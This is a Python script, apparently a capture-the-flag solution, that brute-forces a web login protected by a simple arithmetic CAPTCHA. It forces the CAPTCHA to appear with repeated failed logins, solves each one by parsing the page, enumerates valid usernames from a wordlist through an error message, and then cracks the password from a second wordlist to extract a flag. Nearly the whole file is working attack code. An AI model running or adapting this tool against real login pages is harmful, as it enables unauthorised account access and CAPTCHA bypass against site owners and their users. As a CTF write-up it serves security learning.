#! /bin/python3

import requests
import argparse

def solveCaptcha(captcha):
    if captcha[1] == '+':
        ans = int(captcha[0]) + int(captcha[2])
    elif captcha[1] == '-':
        ans = int(captcha[0]) - int(captcha[2])
    elif captcha[1] == '*':
        ans = int(captcha[0]) * int(captcha[2])
    elif captcha[1] == '/':
        ans = int(captcha[0]) / int(captcha[2])
    return ans

def crackUsername(url, captcha):
    print('[+] Starting username brute force...\n')
    f = open('./usernames.txt', 'r')
    for i in f:
        ans = solveCaptcha(captcha)
        myData = f'username={i.strip()}&password=letmein&captcha={ans}'
        sReq = requests.post(url, data=myData, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        sReq = sReq.text.split('\n')
        if 'does not exist' not in sReq[104]:
            print(f'!!! Username Found: {i.strip()}\n')
            crackPassword(i.strip(), captcha)
        else:
            captcha = sReq[96].split()

def crackPassword(uName, captcha):
    print('[+] Starting password brute force...\n')
    f = open('./passwords.txt', 'r')
    for i in f:
        ans = solveCaptcha(captcha)
        myData = f'username={uName}&password={i.strip()}&captcha={ans}'
        sReq = requests.post(url, data=myData, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if len(sReq.text) < 100:
            print(f'!!! Password Found: {i.strip()}\n')
            print(f'!!! Flag: {sReq.text.split()[1][4:-5]}')
            quit()
        else:
            sReq = sReq.text.split('\n')
            captcha = sReq[96].split()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Brute force username and password with captcha.')
    parser.add_argument('--host', '-t', type=str, help='Target host URL')
    args = parser.parse_args()

    if args.host:
        url = f'http://{args.host}/login'
        print(f'[+] Starting bruteforce with target URL: {url}\n')
        
        for i in range(0, 10):
            myData = 'username=admin&password=letmein'
            sReq = requests.post(url, data=myData, headers={'Content-Type': 'application/x-www-form-urlencoded'})
            sReq = sReq.text.split('\n')
            captcha = sReq[96].split()

        crackUsername(url, captcha)
    else:
        print("Error: You have to specify the target host using the --host or -t flag.")
        print("Usage: ./script.py --host $IP")
